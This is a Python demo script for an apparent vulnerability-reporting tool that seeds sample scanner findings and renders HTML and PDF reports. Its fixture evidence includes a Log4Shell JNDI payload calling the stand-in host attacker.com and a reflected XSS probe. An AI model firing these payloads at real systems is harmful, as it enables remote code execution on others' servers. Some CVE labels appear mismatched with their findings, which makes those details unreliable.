"""
Standalone verification script to seed sample data and generate HTML and PDF reports.

Usage:
    python api/reporting/sample_report.py
"""

from __future__ import annotations

import logging
from pathlib import Path
import sys

# Ensure repository root is on sys.path when executed directly
_project_root = str(Path(__file__).resolve().parent.parent.parent)
if _project_root not in sys.path:
    sys.path.insert(0, _project_root)

from api.db.models import FindingModel, Project, Target
from api.db.session import SessionLocal, init_db
from api.reporting.generator import ReportGenerator

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(name)s: %(message)s")
logger = logging.getLogger("sentrypack.reporting.sample")


def generate_sample_reports() -> None:
    """Seed sample data and generate sample HTML & PDF vulnerability reports."""
    # 1. Ensure database and tables exist
    init_db()
    db = SessionLocal()

    try:
        # 2. Create or reuse Demo Project
        project = db.query(Project).filter(Project.name == "SentryPack Demo Report").first()
        if not project:
            project = Project(
                name="SentryPack Demo Report",
                description="Comprehensive vulnerability assessment demo covering web and database infrastructure.",
            )
            db.add(project)
            db.commit()
            db.refresh(project)
            logger.info("Created project '%s' (id=%s)", project.name, project.id)
        else:
            logger.info("Reusing existing project '%s' (id=%s)", project.name, project.id)

        # 3. Create or reuse Targets
        t1 = (
            db.query(Target)
            .filter(Target.project_id == project.id, Target.name == "web-server-01")
            .first()
        )
        if not t1:
            t1 = Target(
                project_id=project.id,
                name="web-server-01",
                ip_address="10.0.0.10",
                status="active",
            )
            db.add(t1)
            db.commit()
            db.refresh(t1)

        t2 = (
            db.query(Target)
            .filter(Target.project_id == project.id, Target.name == "db-server-01")
            .first()
        )
        if not t2:
            t2 = Target(
                project_id=project.id,
                name="db-server-01",
                ip_address="10.0.0.20",
                status="active",
            )
            db.add(t2)
            db.commit()
            db.refresh(t2)

        # 4. Seed Findings across targets (ensure all 5 severities present)
        # Clear existing findings for clean repeatable demo
        db.query(FindingModel).filter(FindingModel.target_id.in_([t1.id, t2.id])).delete(synchronize_session=False)
        db.commit()

        sample_findings = [
            # Target 1 findings (Web server)
            FindingModel(
                target_id=t1.id,
                title="Apache Log4j2 JNDI Remote Code Execution (Log4Shell)",
                severity="Critical",
                cve="CVE-2021-44228",
                cpe="cpe:2.3:a:apache:log4j:2.14.1:*:*:*:*:*:*:*",
                description="Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints.",
                remediation="Upgrade Apache Log4j to version 2.17.1 or higher, or set log4j2.formatMsgNoLookups to true.",
                evidence={"payload": "${jndi:ldap://attacker.com/a}", "response_code": 200, "vulnerable_header": "X-Api-Version"},
            ),
            FindingModel(
                target_id=t1.id,
                title="Cross-Site Scripting (Reflected)",
                severity="High",
                cve="CVE-2023-28432",
                cpe=None,
                description="Unsanitized user input in search query parameter is directly rendered in response body allowing arbitrary script execution.",
                remediation="Implement strict context-aware output encoding and Content-Security-Policy headers.",
                evidence={"parameter": "q", "injected": "<script>alert(1)</script>"},
            ),
            FindingModel(
                target_id=t1.id,
                title="TLS 1.0 / 1.1 Protocol Enabled",
                severity="Medium",
                cve=None,
                cpe=None,
                description="The server supports deprecated TLS 1.0 and TLS 1.1 cipher suites vulnerable to CBC padding oracle attacks.",
                remediation="Disable TLS 1.0 and TLS 1.1 in web server configuration; enforce TLS 1.2 and TLS 1.3 only.",
                evidence={"supported_protocols": ["TLSv1.0", "TLSv1.1", "TLSv1.2", "TLSv1.3"]},
            ),
            FindingModel(
                target_id=t1.id,
                title="HTTP Server Banner Disclosure",
                severity="Low",
                cve=None,
                cpe=None,
                description="The HTTP response headers reveal explicit web server software version (Apache/2.4.41).",
                remediation="Configure ServerTokens Prod and ServerSignature Off in Apache configuration.",
                evidence={"server_header": "Apache/2.4.41 (Ubuntu)"},
            ),
            FindingModel(
                target_id=t1.id,
                title="Strict-Transport-Security Header Missing",
                severity="Info",
                cve=None,
                cpe=None,
                description="The web application does not transmit the Strict-Transport-Security (HSTS) HTTP response header.",
                remediation="Add 'Strict-Transport-Security: max-age=31536000; includeSubDomains' to all HTTPS responses.",
                evidence={"checked_url": "https://10.0.0.10/"},
            ),
            # Target 2 findings (Database server)
            FindingModel(
                target_id=t2.id,
                title="PostgreSQL Default Administrative Password",
                severity="Critical",
                cve="CVE-2019-9193",
                cpe="cpe:2.3:a:postgresql:postgresql:11.2:*:*:*:*:*:*:*",
                description="PostgreSQL superuser account 'postgres' is configured with default or blank credentials allowing superuser SQL execution.",
                remediation="Assign a strong unique password to the postgres superuser and configure pg_hba.conf to reject unauthenticated peer/trust logins.",
                evidence={"user": "postgres", "auth_method": "trust", "status": "authenticated"},
            ),
            FindingModel(
                target_id=t2.id,
                title="Unencrypted Database Traffic Permitted",
                severity="Medium",
                cve=None,
                cpe=None,
                description="Database service accepts plaintext connections without requiring SSL/TLS encryption.",
                remediation="Enable ssl = on in postgresql.conf and enforce hostssl rules in pg_hba.conf.",
                evidence={"ssl_required": False, "negotiated_ssl": False},
            ),
        ]

        for finding in sample_findings:
            db.add(finding)
        db.commit()
        findings_count = len(sample_findings)
        logger.info("Seeded %d findings across 2 targets", findings_count)

        # 5. Instantiate ReportGenerator
        gen = ReportGenerator()

        # Ensure output directory exists (supports /tmp across Linux and Windows)
        out_dir = Path("/tmp")
        out_dir.mkdir(parents=True, exist_ok=True)

        html_out_path = out_dir / "sample_report.html"
        pdf_out_path = out_dir / "sample_report.pdf"

        # 6. Render HTML Report
        html_content = gen.render_html(project, db)
        html_out_path.write_text(html_content, encoding="utf-8")

        # 7. Render PDF Report
        pdf_content = gen.render_pdf(project, db)
        pdf_out_path.write_bytes(pdf_content)

        # 8. Print Output
        print(f"HTML report: /tmp/sample_report.html")
        print(f"PDF report:  /tmp/sample_report.pdf")
        print(f"Findings seeded: {findings_count}")

    finally:
        db.close()


if __name__ == "__main__":
    generate_sample_reports()
